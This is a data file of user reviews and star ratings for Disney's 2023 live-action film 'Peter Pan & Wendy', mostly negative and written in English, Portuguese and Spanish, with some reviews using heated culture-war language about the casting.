Please talk to real people in the real world (possibly from different parts of the country) before the TYPE OF FILMMAKERS who make many films decide to do movies .,0.5
"Honestly, I actually hate all of Disney's live action remakes, but this one has to be the worse. The action, writing. Direction, special effects, they are all horrible.

"Giving Captain Hook an ""origins story"" might have been a very good idea if the film didn't suffer an identity crisis. It is not particularly appealing to children: the level of fantasy and imagination is rather low for what one would expect from a Disney Peter Pan film, and the level of drama, morality and complexity of the conflict between Pan and Hook is too dense for children, and too shallow for more mature audiences. In addition, the characters suffer from a general lack of charisma, some of the visual effects are too goofy for a Disney film in 2023, and the cinematography is also too flat.",1
"Not fly at all. But it reminds us at least of the times, when Disney was actually good.",0.5

Entretenida pero no era lo que esperaba.,0.5
o filme e bom mas nada al√©m disso ele atualiza a historia e deixa de certa forma mais atual aqui os personagens tem mais tramas e enredos do que os de 1953 mas a falta de magia grita muito e faz com que o filme perca tudo de bom que tem,3
"Zero Magic, annoying leads, what about that Tinker? Ooooh beloved animation, never matched but this was just worse than recent adaptations... Jude Law went to the overacting school without reaching a glimpse of Pacino-ness, my oh my :) and those songs?! Saving graces, Alyssa Wapanat√¢hk as Tiger Lily and photography :)",1
"The overall quality of the movie was quite poor. The acting from Peter Pan and Tinkerbell was so bad it was distracting and ruined the movie. Wendy and Hook well much better portrayed. Bad performances in a movie are ultimately the director's responsibility so much blame belongs there. Some visual effects were quite good but not enough to save the movie. The storyline was forgettable but what sank this movie was the incredibly slow pace and poor acting. Embarrassed for Disney to have their name on it. One more thing, who are these 60+% of critics who like it!? Seriously?",0.5
"Visually it's a beautiful film, good acting from j.law.. unfortunately the rest where meh.. none of the cast seemed to have an on screen connection, pans acting was wooden at best, I found myself uninvested in the story before halfway into the film I don't think it was the actor but I couldn't stand Wendy, less compassion than previous representations, which I felt wasn't an improvement for the character personally, smee was okay.. In short the movie hasn't finished yet and my curiosity brought me to see if my opinion met the mass... Seemingly so.",2
"P√©ssimo, perca de tempo!",0.5
"For a modern remake with all the technology they have available today, I didn't think this film even looked good. Rather than being bright and magical, it felt dull and lifeless. And I really don't understand why they portrayed Wendy and Peter in the way that they did - Wendy is just flat out obnoxious from her first scene and Peter - well, they made him essentially the villain of the piece. I'm not sure the writers had any understanding of the source material - and, if they did, they didn't appreciate any of it.",0.5
"So...this movie...is special here are my reasons 1. There wasn't an umph Like most disney movies now days, this movie doesn't have an umph like the disney movies made in the 1990s. Don't get me wrong I love new movies, but it just feels like the magic was lost. Kind of like if you have a paper due at 11:59 and it's 10:00 and you haven't even started. Then you keep procrastinating and before you know it you have 30 minutes left. In those 30 minutes you speed run your essay and it is obvious that it was a last second thing. Yeah that is this movie. 2. There wasn't a plot.... I mean basically this movie can be described in one paragraph...Wendy is abt to go to boarding school, but she doesn't want to grow up and go. So in turn her and her brothers go to Neverland with Peter almost get killed by pirates. Her brothers get captured. Wendy meets the lost boys and saves her brothers with the lost boys and Peter. The conflict between Peter and Hook is shown. They all get captured, and Peter almost dies. This girl that was mentioned earlier saves him. Giant fight scene. They all are saved and all the pirates die including hook. Then Wendy and her brothers go home. That's it... 3. Some scenes were removed In the original Peter pan there was an umph for example there were mermaids, more introduction to the characters, and my favorite part was that tinkerbell was spunky. But in this movie there was none of that. I mean I would have liked to see more not less. For example disney could have added Ariel from the live action Little mermaid in there. But of course there wasn't any of that. In general I do not recommend this movie. It would be really confusing for someone who hasn't seen the original (So just watch the original). Thank you for reading!",0.5
Disney ruined a classic movie that we all loved as children,0.5
It is a great adaptation that improves all the characters and has spectacular cinematography and photography. I didn't like the ending and the few jokes seemed a bit stale to me. In my opinion the best live-action of Disney. Do apportations to the classic history.,4
"Look, I tried, but after 30 minutes I started doing something else because it didn't catch my attention.",1.5
"DISNEY is simply racist and too feminist. It is so obvious and cringe. Every girl is a Mary Sue here and the one that was supposed to be the hero, Peter Pan is simply a nonlikeable inmature jerk. I mean Hook is more likeable! A lil skinny girl that never fought in her life taking on multiple big Pirates as if she was Bruce Lee... who pitched that and said to themselves ""well that makes so much sense!"". LOST BOYS with girls!!! That is just like dumping a camel in the middle of the ocean and expect it to walk on water... makes absolutely no sense. Peter Pan doesnt resemble or reminded anybody of Peter Pan. Tinkerbell reminded me more of an orc or a witch, so much cringe to go around here. The only good thing in this movie is Jude Law which is not surprinsing as he is pretty awesome in anything. Is like having Michael Jordan in a team where no one else has touched a basketball. Movie should have been titles ""Wendy Saves Neverland!""... not even mentioning Peter Pan. This movie is like what happens when all the writers are a bunch of single-mid-40s-feminist-women-living-alone-with-a-bunch-of-cats and the men involved are a bunch of vegan simps and soy boys. No real man was involved in this production for this to be green lighted. This is how you kill one of the most timeless and beautiful stories ever told. Thanks God for HOOK, Peter Pan and Pan that came before it. If I could give this ZERO stars I would... in fact if I could do negative stars I would. This was just cringe after cringe moments of absurdity.",0.5
"Terrible. It's isn't worth watching in my opinion. Yeah it's well polished but the plot is bad, the writing is bad, and the characters either serve no purpose or aren't the best actors for their role",0.5
"It was OK. Jude Law was great as Hook. The actress who played Wendy was solid too. Wasn't fully invested in the young actor's portrayal of Pan ‚Äî just came off as a one dimensional character and there's so much more to Pan to make him interesting. The young actor did a good job I just think there could've been more there. Came off kind of 90s early 00s Disney Channel original movie -type acting. The 90s classic - ""HOOK"" - will remain my most favorite Pan-movie. That stories approach w a Pan who eventually left Neverland and grown up to get pulled back is such a great premise to an old tale. This latest stab at Pan and the Pirates was more or less a rehash of the original animated entry. It is fine. Worth checking out for sure. But it's repeat value is non-existent.",3
"Terrible movie, I don't undrstand the idea of taking a story that tells a tale and just completely destroy it trying to make it a girl-power movie. If you want to bring a movie where the female has the lead role, then please create a new amazing story, instead of destroying something that has a background, an origin.",1
Existe uma Historia e uma originalidade no Peter Pan. Cad√™ aqui? PESSIMO FILME,0.5
"It's pretty empty: there's not much happening in the story or character department aside from the big change of this adaptation, giving Hook a backstory. The world feels empty in part because of it doesn't feel lived in. You learn nothing about Neverland watching the film, it's just a random island, and the characters that populate it are unremarkable. For all the overreacting about adding girls and people of other ethnicities to The Lost Boys, almost none of them even have names. None of them have personalities, and none of them are that important to the narrative. They act more like a faceless hoard. Even Tinker Bell lacks any personality traits. The most she has to do is make highly exaggerated expressions to the camera. The worst example has to be Wendy's two brothers, who I consistently forgot were even in the movie (and I watched it twice) I'm not sure the one with the top hat even said anything throughout the entire film, and the other is just ""Boy with bear"" They, and rest of the supporting cast, are effectively extras. It's an egregiously uninteresting film, unless you're a huge Peter Pan fan interested in seeing a different director's take on a character. The pluses would probably be that the Peter, Hook, and Wendy, are all well acted, and though the directing choice to make Neverland as colorless, dull, and normal as possible is an undoubted flaw, the directing of the camera itself can interesting at times. The shot of arriving at Neverland is one of the coolest shots I've seen in a while.",2
"Peter pan is my favorite story. Im pretty disappointed in this. Its like a cheap knock off of Peter Pan with Jermey Sumpter. Almost to the exact scenes in some spots. Actors are bleh here. I think i also expected them to look different. I expected more originality outside of that. Honestly, i expected more in general. If disney is going to redo movies a million times over, at least make it worth it.",2

"What a disaster, whats the point of fighting the patriarchy if you are just going to replace it with the matriarchy?",0.5
An unwatchable disaster.,1
"I've not really been a fan of Peter Pan movies in the past, but I loved this new modern adaptation with its all inclusive cast. Loved that there are girls in the lost boys and that Wendy is a strong female role model. The casting of Peter was spot on. His impish look and sulky demeanour reminded me more of the character in the book than previous films. Plus being a mixed race child growing up in the 60s & 70s watching Disney films with all white casts (even the animated films, apart from jungle book üòò) there was no one who looked like me to relate to. This film encompasses all with great diversity, which is really heart warming. The back story showing Hooks vulnerability and why he and Peter are enemies was interesting, as it gave a reason for their hostility, so not just mindless hatred and fighting against each other . The fact that they explain all their hurt to each other, then accept each other, gives a deeper and more meaningful message‚Ä¶‚Ä¶apart from this, I loved the action, the characters and catchy pirate sea shanty's. Disney magic was there in droves! 5 stars!",5
I really enjoyed the film and the way it was all put together the characters were more relatable than previous films and in my opinion it felt like it had class instead of the usual glitz and over the top effects that Disney usually have plus I enjoyed the characters. Back story's added a little extra,5
"Disney continues to take their old classic films and strip away everything that made those films great with a drab, souless remake that fails to capture any of the charm the originals had. They dont just lack the charm, they completely disrespect the original source by completely changing how characters look and act. Im black but i really hate this new trend of race swapping original white characters for black ones. It just doesnt sit right with me and its also rhe reason i have no interest in the little mermaid movie",0.5

"Why does Disney think that their characters are remotely likable anymore? Wendy is a brat and Peter Pan is so very boring. Even if this movie was review bombed, it still doesn't make up for how bad it actually is.",1.5
"Yet again, Disney takes another timeless classic from it's golden history & completely ruins it with modernism. Not only is ""Peter Pan"" not the focus or hero of the story, he's actually the villain. The rivalry with Captain Hook makes Hook a betrayed ""Lost Boy"" (because they're not all boys. Can't have even an adolescent ""patriarchy"") who grew up, & Pan wouldn't let him back in the group, so Pan cut off his hand. ?? Can't have pirates acting like pirates for pirate's sake (even though Disney made an entire series on PIRATES). & now instead of being a loving & maternal figure that makes the ""Lost boys"" realize that having mature feminine nurturing is essential (because they already have Tiger Lilly's leadership w/out Pan, anyways), Wendy's just a(nother) girl-boss with the (magical) strength to take on 2 grown pirate men in a sword fight, despite being a small & barely teenage girl. Tinkerbell, who had an intense & intricate relationship with Peter (who was jealous of Wendy & even betrayed the Lost Boys & Peter to Hook over her) has been reduced to her (new) ethnicity, doing nearly nothing in the plot except show up to sprinkle fairy dust on stuff so that it can fly. Tiger Lilly, the once protected Native Princess, of the Tribe of Natives that were more or less ""frenemies"" with Pan & the Lost Boys (remember, they were going to burn the Lost Boys at stake, if Tiger Lilly wasn't returned. Even though Hook was responsible, the Lost Boys were going to pay the price) is now hanging out with the LB's as Pan second in command, more or less (which HAD been Tinkerbell's role, even though she couldn't talk). Apparently (she's taking a page from Moana's book) & would rather do her own thing than be with & serve as a leader with her people? Because nothing says ""powerful native princess"" like commanding a group of children. If you want to watch a Live Action version of Peter Pan, watch Steven Spielberg's ""HOOK"", with Robin Williams & Dustin Hoffman. Then best Pan vs Hook combination since the original animated Disney film.",0.5
I love the twist at the end. It's definitely a good movie and I love how Wendy and Tinker Bell came together.,5
not good or even original anyone who worked on this movie should never make another movie ever again,0.5
When will Disney stop ruining their classic films?,1.5
"Why? This is like the 4th horrible live action remake in a row. This was painful to watch. To think that not long ago I thought Disney could do no wrong. It is like someone who hated Disney movies their entire life took over, with the mission to wreck every single one of them.",0.5
"filme sem nenhuma magia da obra de Peter Pam, apagaram o protagonista , e s√≥ se preocuparam em sinalizar virtude., subvertendo toda a obra. N√£o fizeram um filme pra crian√ßas.",0.5
Absolute Tragic interpretation that leaves all feeling joyless and bored,0.5
Good efforts for sure. But overall I just couldn't get woth it. Half baked acting at best. Had me thinking about the movie Hook the entire time. Watch it if you need to day you did. But honestly not worth the money.,0.5
"It's not even OK. The fun is completely taken out of it, and replaced with peril, and constant anxiety as children are kidnapped from their homes and taken to a world where Peter Pan is incredibly insecure. It is essentially a copy off of the original cartoon, without the good from it. It seems like Disney is trying to stuff a bad remake down our throat without giving us any reason to care. We choke on it, and a lot of us end up spitting it back up.",1.5
What is this?? Because this movie has sewer color and everything is lifeless and dull??,0.5
This is a truly awful movie. All the fun was stripped out and all that is left is an empty attempt at being inclusive. I applaud diversity but this movie only exists to be inclusive. Not entertaining. Not clever. Not fun.,0.5
A Disney esta acabando com a minha inf√¢ncia!! Posso dizer que √© um dos piores filmes que assisti!,1
"Terra dos walldisneys perdidos, como esta empresa est√° destruindo nossa inf√¢ncia!",0.5
"This is not a remake, this is a whole new and completely re-written movie. I was really looking forward to this movie, but it was apparently made by someone who hated the original material and decided they knew better. Nothing wrong with the original. Why spend so much money on something not even half decent?",0.5
"Absolutely awful remake. Who is coming up with this stuff? How does this get the green light? Not only are the lost boys changed and the physical characteristics of the characters changed, the personalities of the characters have changed. Where's the confident, cocky Peter Pan? Where's the sweet, motherly Wendy? Where's the tinkerbell that's whimsical and extremely jealous of Wendy? I understand wanting to make films that include everyone, but how about making new films instead of trying to shoehorn inclusivity into classics. Maybe Disney has lost the ability to make decent family films now and there's no other options than butchering the classics that mean so much to so many. I feel that The Little Mermaid remake is probably headed for this same fate.",0.5
"I am a huge fan of the story of Peter Pan in general. I love the idea of the boy who never grows up. So when a new adaptation comes along, I've got to see it. There were some things I liked about this version, and some that I didn't. What I liked: The mermaids and the island were lovely. I enjoyed the scenic views. I did like the old manor the kids lived in. I thought that was an interesting change. I loved seeing Jude Law play Hook. He is amazing as always. I liked that one of the Lost Boys had Down Syndrome. I'm all for more inclusion of neurally diverse actors. And I liked that Wendy was a strong character. What I didn't like: The movie is called Peter Pan and Wendy, yet it didn't really seem about them. In fact, Peter wasn't even the star. He was only a side character. I kept waiting to see more from him. I felt disappointed there. Maybe the actor didn't sell me, I don't know. I didn't find him that expressive or exuberant. Peter should be over the top in my opinion. I didn't feel it. The movie seemed more about Wendy and Hook. Overall I did like it. There are some fun scenes. Not favorite movie material though.",3
"So much potential wasted, but kinda nice.",2.5
An absolute abomination. Nothing like the original 2003 film. Storyline is completely off from the cartoon as well as 2003 version. It is dark and dull. No colour. Neverland is just an island off of scotland by the looks. All the magic looks super fake. At least the 2003 version didn't look as CGI'D.,0.5
"Not worth the time it took to watch. Stick to the 2000s version. It ruined Wendy and her character and complete changed Hooks background to make you hate Peter instead of Hook. Also what did they do to Tinkerbell? Tinkerbell had no character, along with the majority of the characters. They tried to make it diverse by flipping the narrative and ruined it completely! Making it Woke ruined it! Also as a female that's not the representation any actual person wants! All it did was put down any male character and ruin the original story! It's definitely not the version of Peter Pan I want my siblings or any future children to watch! Well done Disney you made an awful film!",1
"Uma vis√£o desconstru√≠da de uma hist√≥ria cheia de modelos. Na tentativa, comum por sinal, atualmente, de justificar o mal e criminalizar o bem. Matam os valores familiares e os pap√©is naturais (dentro da cultura que pertence), para criarem uma rota alternativa e moldada no objetivo financeiro, ao inv√©s do art√≠stico.",2
"Movie without magic and charm! Disney once again hits another ""success"" towards failure and the destruction of what it once was. I would never let my children watch a movie like this: it's not entertaining, dark and charmless, the actors (especially those who played Peter Pan and Tinker Bell) should take inspiration from Jeremy Sumpter and Ludivine Sagnier who gave an amazing performance in 2003. A movie more concerned with meeting certain agendas than entertaining.",0.5
"Severely dull, lacking magic. Peter Pan was not portrayed well, lacking boyish fun, confidence and charm. While the pot attempted a unique twist it was too slow and bland to keep viewers watching. Disappointing to say the least.",1
Just terrible writing & storytelling. The show is just boring and bad.,0.5
"The story was very poorly planned with terrible errors in the script. Pan is much more than a movie, it's life's learning that Captain Hook and the man who runs away from the time that is devouring him, in the representation of the crocodile, and Pan is always those who don't want to grow up and stay young, but Wendy is the strong woman and she knew that she guides along with those who understand that time will take everything but together they will have the ability to understand and move on to face a different kind of false faminism that teaches nothing to children in this film.",0.5
"Soulless. Please watch Hook or any other version ever created instead. They completely bastardized the characters and source material. Sad, pathetic, and disappointing.",0.5
"Disney has absolutely lost their magic with this forgettable adaptation. No chemistry with the cast, lacklustre storyline, and incredibly cringy dialogue. Feed it to the crocodile.",0.5
"Soulless‚Ä¶my children checked out after about 20 minutes. I checked out about 40 minutes later. This movie is terrible. I was a young boy when the original came out. Peter Pans mischievous smile and his demeanor was something I took into my back yard that summer. That was completely missing. Instead, the film focused on darker themes that no child experiences‚Ä¶writers for Disney need to stop putting their adult brains full of bias into the realm of childrens movies‚Ä¶seriously, stop. Oh and girls as Lost Boys? I guess the writers are saying that girls are as dumb as boys‚Ä¶since that is why the source material made them all boys‚Ä¶. Congrats and no thanks.",0.5
"If it was possible to give zero stars, this film would be worth it. Horrendous.",0.5
"Awful, the Disney disrespect your legacy.",1
"A faithful adaptation that kept the same themes as the original story with more backstory and depth to characters. Fun family movie, very fun to dissect and analyze.",4
"Not sure why this movie got so much hate - I was very pleasantly surprised! It took some liberties with the original, as I'd expect from an adaptation, but there were some good twists and a hopeful end. 4/5 would recommend and watch again.",4
"Disappointing, visually fine, but generally dour and not at all uplifting",0.5
I don't even know what to say. Disney should not even buy their name on this fiasco. It not only misses any of the original theme it's just plain terrible.,0.5
If you want to be bored then this is the film for you. Fell a sleep to start with. The actors are awful. How the hell could disney get this so wrong. I like altering the casts but at least employ people who can act. Wendy and Peter are so wooden it makes the film unwatchable.,0.5
"I dont care what anyone says about hating live actions. I love them, and ever since Disney started live actions ive been wishing for a Peter Pan live action... this is sadly what disney produced.. if you're looking for a more accurate peter pan the 2003 version is 100 times better. There was no magic in Neverland, Hook isnt scary. The ""lost boys"" are girls. There was no chemistry between Peter and Wendy. Tink likes Wendy? No Indian Tribe or ticking crocodile. Mr Smee didnt even come off as dumb/clueless. I was hoping Disney would bring something more that the 2003 didnt. Although honestly the 2003 live action peter pan actually did a really good job. Followed the lines, a great story book feeling. This movie literally didnt feel like Peter Pan and Wendy. It shoulda just been called Wendy. Sucks knowing Disney wont try again :(",0.5
This is the first review I've ever done for a movie because of how bad it was. There wasn't any inspiring or captivating parts in the entire movie. The cinematics didn't even help create an emotional connection. It was very tough to even sit through it.,0.5
"not enough pater pan, all round meh",1.5
Disney have lost all their magic. Terrible movie all round. I will be cancelling my subscription.,1
"Okay i have to say the audience score is full of bull, I honestly enjoyed it I mean it tells the story in a different way like how Pete's Dragon and Jungle Book did, plus i didn't mind the diverse thing either plus I also enjoyed Jude Law as Hook, i think this movie is overhated in my opinion and I enjoyed it",4
"A pathetic remake that has no need to exist, this is another in the string of disappointments that Disney has made. They have no original ideas, and they're ruining young actors careers in the process.",0.5
"My, what a waste of a good story. What's wrong with Disney? They seem to take out the parts of a story that make the story worthwhile and put in garbage that stinks worse than a five day old corpse. Like a rotting corpse, it's next to impossible to get the stink out after seeing it. A total waste of time.",0.5
"None of the charm and joy of the older version. Seems like an entirely different story based on the good one, but obviously done far worse. Way too woke and unrealistic for the time period it is supposed to be based in.",1
"Disappointing, It's another generic emotionless movie from Disney, that insists in destroy it's own legacy",1
Slow and focused more on politics than the story,0.5
n√£o √© um filme para crian√ßa. paleta de cores falha. a terra do nunca n√£o existe. politica demais,0.5
"Totalmente de construida y sin ning√∫n sentido. Muy lejos de la obra original, no hab√≠a ni√±as entre los ni√±os perdidos a excepci√≥n de tiger Lily que era una ni√±a!! ahora es grande? para que entonces traer a Wendy como figura de autoridad??",0.5
"A very dark movie, Wendy is a rude and lying girl, the fairy does not shine, and treats her completely changed. It is not what one expects",0.5
"The movie is boring, especially Neverland, the story between Peter and the Capitan may had worked but Peter is a really flat character and the acting is so poor, why Wendy and Timkerbell are friends, they need to stop doing that they destroy a great opportunity to put those characters in complex situation til they become real friends, any way just a flat movie, something that you could watch in the airplane while your flying, because you can relax and enjoy the movie without paying that much of attention to what is happening.",1
Garbage! I tried to get past the political view point and just watch the story but even that was impossible. Another flop from Disney!,1
"If you care about new, original content, Disney+ is slowly losing its value. This monstrosity is just the latest in a string of straight to video.... Err... live action remakes to insult the audience, stray from the source material, and result in a bland, soulless product designed to cater to the whims of cancel culture. Disney is creatively bankrupt. The company that made its bread and butter on creative filmmaking is dead.",0.5
I wish I could rate it negative stars. Taking the newish GF and her 2 children to the movies and they wanted this. I was struggling to stay awake and/or not erupt in a woke stuff induced exasperation when the 2 kids asked if we could leave. When an 8 and 10 year old think a Disney movie sucks you know it is bad.,0.5
No magic in this film. Disney movies lack any charm nowadays.,0.5
"I think I am to the age that I know I love the story of Peter Pan so much I actually come into new projects with LESS on the line, as each subsequent telling effects me less and less. I know I love Captain Hook regardless of how wonderful or awful an actor portrays him in new iterations. So, 15 minutes into this movie I am half paying attention to, I turned to my wife, gazing up from my phone to tell her, ""this may very well be the best Peter Pan incarnation we've ever seen on a screen, however, I can't watch the same story, over and over again..."" Sooo many adventures to be told in Neverland and we as an audience only ever get this one maiden voyage with the Darlings. Yes, book accurate, but my brain can't keep looking at the bowl of Lucky Charms and then only ever eat the non-marshmallow bits. This new Pan movie is gorgeously shot and I loved the portrayal of the kids and the titular character. The only thing I questioned was Jude Law's Captain Hook, which is surprising as I always love Jude Law. . . And then... I saw why he seemed different... half-way through the movie, the production introduces a twist to the beloved story and man oh man, I loved it! Also, Jim Gaffigan is A+ Smee. I could say more, but, if you love Peter Pan, give this a go, please. It is different, but this story, if they are going to keep making it over and over, really needed something new, and I liked this new take on the characters. I can see if you wanted a new version of the streamed-lined, nothing fancy story Disney gave you, this isn't it. But goodness me, passing by some of these reviews on my way to this little text box, Disney is in quite a pickle. People don't like when you make shot-for-shot remakes and they don't like when you change things... I dunno, I just took this as it is and not of some larger commentary of all modern Disney... Also I did see many people leaving reviews that ""turned it off"" halfway through... So they never got to the twist and thus the interesting pivot point the other Pan stories don't have... Dang... Anywho, if you have some time, I'd recommend.",3.5
"The fresh take on the relationship of Peter Pan and Captain Hook is compelling and the way it is executed in the second-to-last act of the film is nothing short of tremendous artistry. The other variations from the traditional story are tremendous as well. There were also gorgeous camera shots and the costumes were impressive. The acting was fine, too.",4
Half star because this site doesn't let you give 0 stars.,0.5
It really does nothing new to Peter Pan or the rest of the cast it came out as plain boring bland and forgettable,1
"Filme que n√£o tem alma, escuro, cinza, simplesmente um lixo puro. √â inacredit√°vel a decad√™ncia da Disney.",0.5
"Brilliant!! A MUST SEE movie for anyone who loves Peter Pan. Alexander Moloney is wonderful as Peter Pan - he plays to the slightly darker side of the character wonderfully, yet shows his playful side too. He was the absolute star - but all of the performances were great. Don't listen to the negative reviews, they admit they haven't even seen it and are just cross with Disney because it's a remake (or they're racist). It's a really great family movie!!!!",5
Was this the same story as the 1902 story? Seems like a totally different story.,1
Timeless themes: gone. Understanding of boys struggles: gone. Excitement: gone. Victorian society commentary: gone. Hello focus group 2023 script hell blandness! Why oh why oh why oh why oh why‚Ä¶.,0.5
"It's unbelievable what Disney is doing with their classics. It is a lack of respect for the public, for the author, for people's intelligence. A story that speaks so beautifully about childhood and the passage of time in life. A GARBAGE MOVIE",0.5
5 years olds are too smart for this movie. Why have a great story to remake but pay a bad writer to make a new movie,1
Filme acaba com a obra original!!,0.5
There's NOTHING of Peter Pan in this movie.,0.5
"Really all you need to know to reveal how cringe and awful this bastardization of a timeless story is, a story that was originally filled with profound symbolism but now just panders to the hot button tired tropes of today, is that Wendy's happy thought is literally dying alone one day. It would be better if this movie had never been made.",1.5
Eu n√£o gostei desse filme!,1
"The magic you've come to expect from Disney productions just wasn't there. Four in the family, none of us liked it.",1.5
A very dull movie that has ripped the soul and wonder from the original story. Disney continues to produce terrible remakes of classic stories. I could not get my head around who was supposed to be the antagonist? I was actually rooting for Captain Hook throughout the movie.,0.5
"Where is the magic of classic Peter Pan design? Bad script, I loved the original as a timeless classic. It was about responsibility, growth, friendships and family. Now they've switched to a bad story. Don't waste your time.",0.5
"Eu pensei que lembraria os filmes da minha inf√¢ncia, mais e s√≥ mais um filme que mudaram tudo.",0.5
"I got through half of the movie, and realized I didn't care about anything in it and turned it off.",0.5
Really bad again from Disney. Can you stop with the politics in your movie you will not win. People are so sick of all of that....,0.5
"Sorry, but I could not make it past the first 15 minutes. Movies should not be painful to watch. What happened to fun and light hearted Disney movies?",0.5
I find it too woke for my taste. It's disappointing really. Disney has fallen.,1
"As someone who consider myself a progressive liberal, this has got to stop. It's gotten so incredibly cringey at this point. Rewriting, reimagining, ruining classics, just to further a hollow corporate cash-grab agenda. If you're falling for this as anything else, I don't know what to tell you.",0.5
Was a load of rubbish,1
"Absolutely terrible. Yet another ""strong female character"" who is a bratty, arrogant, abusive(she slaps PETER PAN- you know ‚Ä¶. meant to be the MAIN CHARACTER) Wendy blames her brothers at the very start!? Peter himself is a whiny little wimp in this film, and the ""Lost boys"" are obviously made for ""MODERN AUDIENCES"" as they are mostly race swapped GIRLS. I could list more atrocious things they have butchered from the original, but I would be here all day. Last thing I'll say is don't believe the shill critics scores or reviews. J.M. Barrie would be turning in his grave if he knew this existed.",0.5
This is an awful movie. The acting is terrible - besides Jude Law - and there are incredibly cringe moments. The movie was boring and the characters were so dull.,0.5
Destru√≠ram o filme. Corromperam os personagens. O filme √© sombrio e melanc√≥lico. Falta a magia e alegria da hist√≥ria. Atua√ß√µes sofr√≠veis. Que coisa triste. Minha filha terminou o filme chorando.,1
"The original works (like any story could) because it mirrors reality in a ""fantastical"" way .. the story is built around the age old problem of men not wanting to grow up and women being the motivating force that drives male maturity. Wendy being a representation of pornography (the best you get in neverland) and Wendy a personified call to family life, commitment and responsibility.. Captain Hook is the enemy because he represents the ageing man who is gradually losing his body to time (the crocodile) every adult in the story is represented as a pirate, because in never land they are all ""bad"" for allowing themselvs to grow up. If you change that .. all you have are character names.. Instead of a fantastic reflection of reality.",0.5
"I tried to put all preconceived notion I have heard about this movie aside. But wow, was everyone right. Possibly one of the worst Disney films I have ever seen. Peter Pan is a soulless actor.",1
It was dark and did not seem like a kids movie(who's the antagonist between peter pan and captain hook anyway),0.5
"No, nope, nope. Another one ruined by disney and a remake that really wasnt needed, nor made any sense. This has almost nothing to do with the animated one, and it is very sad that such an old animation is so much better than the modern live remake. This is trash, even for kids.",0.5
What complete and utter garbage. This abomination turned the beloved source material inside out and on its head. I have taken the uncharacteristic step for me to warn all my friends with kids to stay as far away from this movie as possible. It horrible. Perhaps its only redeeming aspect was the musical soundtrack.,1
I thought it was dull uninteresting. It left me feeling unimpressed. It fell flat. Characters were uninteresting all the girls were the same no diverse characters. No diverse personalities is what I mean. Don't like the fact that they completely Rewritten JM Barry's classic tale. And turn Peter Pan into a sniving wimpy little cry baby. I'd rather watch the original animated version or the classic play featuring Sandy Duncan as Peter Pan. That was far more interesting than this one,1
"Well, I actually didn't make it through the whole movie. At around the hour mark I was so bored and stupefied that I just couldn't watch anymore. Disney just can't make good movies any longer and this was among the worst.",0.5
I want to gouge my eyes out with capt's hook,0.5
Lacks everything that made the original a classic,1
"When it comes to remakes, more often than not, nothing beats the original. But it is hard to compare this film with the original being animated. Yes it is based on the same story and for a lot of us, the original was the first time we heard of Peter Pan (unless you were familiar with JM Barrie's novel). There has already been a live action version of Peter Pan which made us love the story even more. Of course with this movie it cannot be a carbon copy of either film. It had the same plot of course but we were able to understand the relationship between Hook and Peter so much more. And Wendy, I feel, seemed so much more realistic. Yes she didn't want to grow up but she wasn't naive enough to think that fighting pirates was a better way to live life. This movie is its own take on a classic fairytale. And while the original has a special place in my heart, I still really enjoyed this movie.",3.5
Not sure why the lost kids wanted to stay in Boringland.,1
"The film is a woke disaster that conveys completely false values like girls shouldn't be mothers etc. The actors' performances are also disappointing, with the exception of Wendy, who is poorly written but well acted.",1.5
"What a terrible movie.. devoid of everything that made the original animated movie great, and stuffed with ideologically driven nonsense.",0.5
"You could tell there was no hope and this film and its characters would be hollow. Since race is a thing here let me say I'm a Latino who grew up on the idea of Pan, lost boys, Neverland and pirates. This sucked it so dry and left this story so empty. Pan was not Pan no kid will want to be him for Halloween or imagine the idea of being Pan . This Neverland is no place a kid would dream of going to. Pirates coulda been any pirates from any cheesy movie that incorporated the idea. And lastly the iconic HOOK, take a good actor and give him a washed out version of an icon of a villain. Then you try to lift up the idea of other characters and create hollow versions that simply check boxes. Love Disney and I do believe ideas should evolve universally but it's staring to feel soulless.",0.5
"The question is ""why""? I loved the original as a timeless classic. It was a childhood classic about responsibility, growing up, friendships & family. This is terrible. I couldn't finish it. If the modern scriptwriters lack talent nor creativity for originality, please don't bastardize the original classics. .",0.5
"Disney being Disney, i dont know why they still with the same",0.5
Awful. So so awful. Don't waste your time. Go fold laundry because that's more entertaining,0.5
I am shocked Disney approved this. The action was underwhelming. Peter Pam's acting was not good. The movie was entirely apathetic. My son stopped watching it early on. The music choices were very strange.,0.5
"The actual formule of Disney movies is awful, totally disrespectful with originals. No one of caracters make any sense. All are horrible.",0.5

"You're killing it lately, Disney‚Ä¶. No, really, you're killing everything you touch. ‚Äî this was really really cringy.",1
"The story, not based on Peter Pan has potential. Maybe inspired, but completely different characters and setting. Crafting your own unique tale is perfectly acceptable in creating something fresh, but that is not what is going on with ""Peter Pan & Wendy"". Audience seeks entertainment rather than moral instruction.",0.5

"Frickin hate this movie, Peter Pan is a heartless little ü§¨.",0.5

"Realy bad, Sad and dark, this os not Peter Pan",0.5
"Completely missing any imagination and no redeemable qualities in any of the characters. I'm not even sure the writers are familiar with the source material. The CGI is awful and clunky, the acting is atrocious at times. Speaking of time, this was a complete waste of mine.",0.5
this movie is simply put a mistake,0.5
Disney should change their name to WOKEY..,0.5
Awful completely awful. A waste of 2hrs.,0.5
One of my favorite movies was ruined in this version of Peter Pan. Highly disappointed and sad as I was so excited to be entrenched my Disney magic.,0.5
"horrible, no quiero ver mas estos tipos de live action",0.5
"Oh my God, what is that? Hahaha Terrible!",0.5
It didn't care for the spirit and soul of the original. While I don't expect a shot for shot remake it was clear there was a hate for the original material.,0.5
"Garbage... Should be call Wendy's show. Peter pan gets beat, he's humiliated, he's villainous, it's all bad. Want to watch something good? May it have the magic and beauty of P. Pan's story? Watch the 2003 movie. Disney lost the hand to make great movies. Is it intended.",0.5
There's nothing to add to this movie. Don't watch it. Don't think about it. Long way down for Disney with a new low point.,1
e uma pena ter q dar meia estrela pq nao pode dar 0 estrelas,0.5
"A complete failure, completely without creativity, without magic and without fun, this choice of filmography is another example of ""realism"" that managed to leave NEVER LAND without color and with an extremely dull appearance, the action scenes are boring and unexciting, the CGI manages to be good most of the time, but the rest of the film is so superficial that it's hard to call it anything really new. Yet another Disney production that can't live up to the original story.",1.5
What a great modern remake of a fun classic movie. Great cinematography and believable characters from the original. Kids loved this movie 16 & 10 years old. As a parent it was fun to watch with the kids. Highly recommend as a family night.,5
